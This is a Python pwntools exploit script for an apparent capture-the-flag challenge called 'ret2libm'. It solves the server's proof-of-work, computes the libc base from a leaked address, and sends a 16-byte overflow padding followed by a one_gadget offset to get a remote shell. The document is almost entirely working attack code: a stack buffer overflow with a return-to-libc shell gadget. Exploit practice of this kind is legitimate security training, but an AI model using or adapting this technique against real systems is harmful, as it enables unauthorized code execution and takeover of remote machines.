import subprocess

from pwn import *

context.log_level = 'DEBUG'
context.binary = ELF('../file/chal_patched') # from patchelf

#p = process('../file/chal_patched')
p = remote('ret2libm.chal.irisc.tf', '10001')

# remote part
p.recvuntil(b'pow) ')
args = ['python3', 'kctf-pow.py'] + p.recvuntil(b'\n', drop=True).decode().split()
r = subprocess.run(args, stdout=subprocess.PIPE)
p.recvuntil(b'Solution? ')
p.sendline(r.stdout)

input('continue')

fabs_sub_libc = 4336880 # from vmmap
shell_offset = 0x4f2a5 # from one_gadget

p.recvuntil(b'pecs: ')
libc_address = eval(p.recvuntil(b'\n', drop=True).decode()) - fabs_sub_libc
p.recvuntil(b'? ')

payload = flat(
    b'a' * 16, #from gdb
    libc_address + shell_offset
)

p.send(payload + b'\n')
p.interactive()
